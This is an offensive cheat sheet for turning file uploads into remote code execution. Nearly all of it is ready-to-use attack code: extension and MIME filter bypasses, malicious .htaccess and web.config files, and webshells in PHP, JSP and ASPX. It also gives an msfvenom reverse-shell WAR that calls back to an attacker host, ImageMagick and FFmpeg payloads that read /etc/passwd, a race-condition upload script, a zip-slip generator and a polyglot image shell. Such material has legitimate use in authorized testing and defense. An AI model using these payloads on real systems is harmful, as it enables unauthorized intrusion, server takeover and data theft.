# File Upload to RCE — Attack Chain

## Extension Bypass

```
# PHP alternatives
.php → .php3 .php4 .php5 .php7 .phtml .phar .phps .pht .pgif .shtml .inc

# ASP alternatives
.asp → .aspx .ashx .asmx .ascx .cshtml .vbhtml .config

# JSP alternatives
.jsp → .jspx .jsw .jsv .jspf

# Double extension (server parses last known extension)
shell.php.jpg
shell.php.png
shell.jpg.php (Apache — parses last)

# Null byte (PHP < 5.3.4, Java < certain versions)
shell.php%00.jpg
shell.php\x00.jpg

# Case manipulation
shell.PHP
shell.Php
shell.pHp
```

## MIME Type Bypass

```http
# Server checks Content-Type header
# Send PHP file with image MIME:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Server checks magic bytes
# Prepend valid image header:
GIF89a; <?php system($_GET['c']); ?>

# PNG header + PHP
\x89PNG\r\n\x1a\n <?php system($_GET['c']); ?>

# JPEG header
\xFF\xD8\xFF\xE0 <?php system($_GET['c']); ?>
```

## .htaccess Upload (Apache)

```apache
# Upload .htaccess to make .jpg execute as PHP:
AddType application/x-httpd-php .jpg

# Then upload shell.jpg containing PHP code
# Access: http://TARGET/uploads/shell.jpg?c=id

# Alternative: override handler
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

## web.config Upload (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

## Webshells by Language

### PHP
```php
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_GET['c']); ?>
<?=`$_GET[c]`?>
```

### JSP
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("c");
Process p = Runtime.getRuntime().exec(cmd);
Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
out.println(s.hasNext() ? s.next() : "");
%>
```

### ASP/ASPX
```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string c = Request["c"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + c;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.UseShellExecute = false;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

## WAR File (Tomcat / JBoss)

```bash
# Create malicious WAR
msfvenom -p java/shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f war -o shell.war

# Deploy via Tomcat Manager
curl --upload-file shell.war "http://admin:password@TARGET:8080/manager/text/deploy?path=/shell"

# Access: http://TARGET:8080/shell/
```

## Image-Based Exploits

### ImageMagick (ImageTragick — CVE-2016-3714)
```
# exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id")'
pop graphic-context

# exploit.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN">
<svg>
<image xlink:href="https://example.com/image.jpg|id" />
</svg>
```

### ImageMagick CVE-2022-44268 (Arbitrary File Read)
```bash
# Embed file path in PNG profile
pngcrush -text a "profile" "/etc/passwd" input.png output.png
# Upload output.png, download processed image, read hex from profile data
identify -verbose processed.png | grep -A 100 "Raw profile"
# Decode hex → file contents
```

### FFmpeg SSRF (HLS)
```
# exploit.m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://ATTACKER/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```

## Race Condition Upload

```python
import threading, requests

URL = "http://TARGET/upload"
SHELL_URL = "http://TARGET/uploads/shell.php"

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
    requests.post(URL, files=files)

def access():
    r = requests.get(SHELL_URL, params={'c': 'id'})
    if r.status_code == 200 and 'uid=' in r.text:
        print(f"[+] RCE: {r.text}")

# Race: upload and access before server processes/deletes
for _ in range(100):
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=access)
    t1.start(); t2.start()
    t1.join(); t2.join()
```

## Zip Slip (Path Traversal in Archives)

```python
import zipfile, io

# Create malicious zip with path traversal
z = zipfile.ZipFile('exploit.zip', 'w')
z.writestr('../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
z.close()

# Upload zip → if server extracts without sanitizing paths → webshell in web root
```

## Polyglot Files

```bash
# JPEG + PHP (valid JPEG that contains PHP)
# Use exiftool to inject PHP into JPEG comment
exiftool -Comment="<?php system(\$_GET['c']); ?>" image.jpg
mv image.jpg image.php.jpg
```
